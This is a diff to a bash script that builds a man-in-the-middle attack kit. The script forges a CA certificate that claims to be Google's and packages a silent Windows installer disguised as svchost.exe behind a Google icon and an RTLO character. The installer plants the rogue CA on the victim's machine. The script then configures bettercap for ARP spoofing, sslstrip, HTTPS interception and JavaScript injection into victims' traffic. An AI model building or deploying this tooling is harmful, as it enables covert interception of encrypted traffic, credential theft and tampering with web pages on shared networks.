@@ -49,14 +49,16 @@ set -euo pipefail
 RED='\e[1;31m'; GREEN='\e[1;32m'; YELLOW='\e[1;33m'; CYAN='\e[1;36m'; RESET='\e[0m'
 color_print() { printf "${!1}%b${RESET}\n" "$2"; }
 
-rm -rf ~/.wine
 WINEARCH=win64 wineboot --init
-MITM_DIR="/tmp/mitm"
-RTLO=$(echo -e '\u202e')
 WINEPREFIX="$HOME/.wine"
-MSF_LOOT="$HOME/.msf4/loot"
+MITM_DIR="/tmp/mitm"
+RTLO=$'\xE2\x80\xAE'
 BUILD_DIR="$WINEPREFIX/drive_c/pyinstaller-build"
 ICON_URL="https://9to5google.com/wp-content/client-mu-plugins/9to5-core/includes/obfuscate-images/images/9to5google-default.jpg"
+CA_DIR="$HOME/bettercap-ca"
+CA_KEY="$CA_DIR/ca.key.pem"
+CA_CERT_PEM="$CA_DIR/ca.cert.pem"
+CA_CERT_CER="$CA_DIR/ca.cert.cer"
 
 # ========================
 # --- ROOT CHECK ---
@@ -69,9 +71,9 @@ fi
 # ========================
 # --- PYTHON CHECK ---
 # ========================
-if [ ! -d "$WINEPREFIX/drive_c/pyinstaller-build" ]; then
+if [ ! -d "$BUILD_DIR" ]; then
     wget https://www.python.org/ftp/python/3.9.1/python-3.9.1-amd64.exe -O /tmp/python39.exe
-    wine /tmp/python39.exe
+    wine /tmp/python39.exe /quiet InstallAllUsers=1 PrependPath=1 Include_pip=1
     wine python -m pip install --upgrade pip setuptools wheel
     wine python -m pip install pyinstaller
 fi
@@ -95,13 +97,15 @@ mkdir -p "$MITM_DIR" "$BUILD_DIR"
 # --- GENERATE FAKE CERTIFICATE ---
 # ========================
 color_print CYAN "[*] Generating fake certificate..."
-msfconsole -qx "use auxiliary/gather/impersonate_ssl;set RHOSTS google.com;run;exit"
-sleep 1
-CERT_CRT=$(find "$MSF_LOOT" -type f -name "*.crt" | head -1)
-CERT_KEY=$(find "$MSF_LOOT" -type f -name "*.key" | head -1)
-cp -f "$CERT_CRT" "$MITM_DIR/ca.crt"
-cp -f "$CERT_KEY" "$MITM_DIR/ca.key"
-openssl x509 -in "$MITM_DIR/ca.crt" -out "$MITM_DIR/ca.pem"
+mkdir -p "$CA_DIR"
+openssl genrsa -out "$CA_KEY" 4096
+openssl req -x509 -new -nodes \
+    -key "$CA_KEY" \
+    -sha256 \
+    -days 3650 \
+    -out "$CA_CERT_PEM" \
+    -subj "/C=US/ST=California/L=Mountain View/O=Google LLC/OU=Google Trust Services/CN=Google Internet Authority G3"
+openssl x509 -outform der -in "$CA_CERT_PEM" -out "$CA_CERT_CER"
 
 # ========================
 # --- CREATE ICON ---
@@ -114,7 +118,7 @@ convert "$MITM_DIR/google.jpg" -define icon:auto-resize=256,128,96,64,48,32,16 "
 # --- BUILD WINDOWS INSTALLER ---
 # ========================
 color_print GREEN "[*] Building Windows installer..."
-CERT_B64=$(base64 -w0 "$MITM_DIR/ca.crt")
+CERT_B64=$(base64 -w0 "$CA_CERT_CER")
 
 cat > "$MITM_DIR/cert-installer.py" <<EOF
 import os as o, subprocess as sp, tempfile as tf, base64 as b, time as t, winreg as w, sys as s
@@ -180,9 +184,9 @@ cp -r "$BUILD_DIR/dist/svchost.exe" "$MITM_DIR/svchost.exe"
 color_print CYAN "[*] Creating SFX archive..."
 cat > "$MITM_DIR/sfx.txt" <<EOF
 ;The comment below contains SFX script commands
-Path=C:\\Users\\%username%\\AppData\\Local\\Temp
 Setup=svchost.exe
 Presetup=google.jpg
+TempMode
 Silent=1
 Overwrite=1
 Update=U
@@ -226,8 +230,8 @@ arp.spoof on
 # Enable HTTP and HTTPS proxy with custom CA cert/key
 set http.proxy true
 set https.proxy true
-set https.proxy.certificate $MITM_DIR/ca.pem
-set https.proxy.key $MITM_DIR/ca.key
+set https.proxy.certificate $CA_CERT_PEM
+set https.proxy.key $CA_KEY
 
 # Inject custom javascript into HTTP/HTTPS traffic
 set http.proxy.script $MITM_DIR/hook.js
@@ -238,9 +242,6 @@ set https.proxy.sslstrip true
 
 # Optional: enable net probe for discovering hosts (if needed)
 net.probe on
-
-# Enable events stream for live traffic logging (optional)
-events.stream on
 EOF
 
 # ========================
